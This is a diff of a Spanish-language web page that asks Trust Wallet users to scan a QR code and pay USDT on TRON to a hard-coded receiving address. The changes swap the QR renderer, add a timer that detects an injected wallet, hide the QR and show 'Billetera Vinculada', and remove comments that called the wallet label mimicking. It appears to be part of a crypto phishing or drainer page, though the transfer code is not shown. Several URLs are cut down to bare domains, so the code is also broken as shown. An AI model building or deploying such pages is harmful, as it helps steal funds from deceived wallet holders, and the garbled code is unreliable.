@@ -38,7 +38,7 @@
             box-shadow: 0 4px 10px rgba(0,0,0,0.2);
             transition: opacity 0.4s ease;
         }
-        #qrContainer img {
+        #qrCanvas {
             display: block;
             width: 200px;
             height: 200px;
@@ -79,7 +79,6 @@
         .status.info { background-color: #1e3a8a; color: #93c5fd; }
         .status.error { background-color: #7f1d1d; color: #fca5a5; }
         
-        /* Etiqueta mimetizada con la wallet del usuario activa */
         #walletLabel {
             display: none;
             background-color: #0f172a;
@@ -93,18 +92,20 @@
             word-break: break-all;
         }
     </style>
+
+    <!-- Script QR seguro empaquetado desde CDN estable de Cloudflare -->
+    <script src="https://cloudflare.com"></script>
 </head>
 <body>
 
     <div class="container">
         <h2 id="titleText">Escanear con Trust Wallet</h2>
         
-        <!-- Bloque del QR Nativo por API de Google -->
+        <!-- Contenedor con Canvas nativo generado por JS -->
         <div id="qrContainer">
-            <img id="qrImage" src="" alt="Código QR de Conexión">
+            <canvas id="qrCanvas"></canvas>
         </div>
 
-        <!-- Etiqueta informativa del emisor conectado -->
         <div id="walletLabel"></div>
 
         <div class="form-group">
@@ -124,7 +125,7 @@
             const input = document.getElementById('amountInput');
             const status = document.getElementById('status');
             const qrContainer = document.getElementById('qrContainer');
-            const qrImage = document.getElementById('qrImage');
+            const qrCanvas = document.getElementById('qrCanvas');
             const titleText = document.getElementById('titleText');
             const walletLabel = document.getElementById('walletLabel');
 
@@ -133,36 +134,44 @@
             // ============================================================
             // CONFIGURACIÓN PRODUCCIÓN REAL (MAINNET)
             // ============================================================
-            const DIRECCION_DESTINO_FIJA = "TU_DIRECCION_TRON_REAL_AQUI"; // REEMPLAZA CON TU DIRECCIÓN RECEPTORA REAL
+            const DIRECCION_DESTINO_FIJA = "TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ"; // REEMPLAZA CON TU DIRECCIÓN RECEPTORA
             const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Contrato oficial de Tether USDT
 
-            // Generación automática del deep link limpio de forma nativa
+            // Configuración del enlace de comando nativo
             const urlDestinoDapp = "https://onrender.com";
             const enlaceCompletoTrust = "https://trustwallet.com" + encodeURIComponent(urlDestinoDapp);
 
-            // Inyección del QR usando el motor de renderizado de imágenes de Google (Infallible)
-            if (qrImage) {
-                qrImage.src = "https://googleapis.com" + encodeURIComponent(enlaceCompletoTrust) + "&choe=UTF-8";
+            // Generar el QR de forma interna mediante la librería QRious (Renderizado garantizado en local)
+            try {
+                if (typeof QRious !== 'undefined' && qrCanvas) {
+                    new QRious({
+                        element: qrCanvas,
+                        value: enlaceCompletoTrust,
+                        size: 200,
+                        background: '#ffffff',
+                        foreground: '#000000',
+                        level: 'H'
+                    });
+                }
+            } catch (e) {
+                console.error("Error al instanciar el canvas QR:", e);
             }
 
             // ============================================================
-            // DETECTOR EN TIEMPO REAL PARA OCULTAR EL QR MOSTRANDO LA WALLET
+            // DETECTOR AUTOMÁTICO DE ENTORNO
             // ============================================================
             function verificarEntornoInyectado() {
                 if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                     const direccionDetectada = window.tronWeb.defaultAddress.base58;
                     
                     if (qrContainer && qrContainer.style.display !== 'none') {
-                        // Ocultar QR de la vista móvil
                         qrContainer.style.opacity = '0';
                         setTimeout(() => {
                             qrContainer.style.display = 'none';
                         }, 400);
                         
-                        // Modificar textos dinámicamente
                         if (titleText) titleText.textContent = "Billetera Vinculada";
                         
-                        // Mostrar la etiqueta de dirección recortada (Muestra los primeros 6 y últimos 4 caracteres)
                         if (walletLabel) {
                             walletLabel.textContent = "Wallet: " + direccionDetectada.substring(0, 6) + "..." + direccionDetectada.substring(direccionDetectada.length - 4);
                             walletLabel.style.display = 'block';
@@ -171,7 +180,6 @@
                 }
             }
 
-            // Monitorear la inyección cada segundo
             setInterval(verificarEntornoInyectado, 1000);
 
             function setStatus(message, type = 'info') {
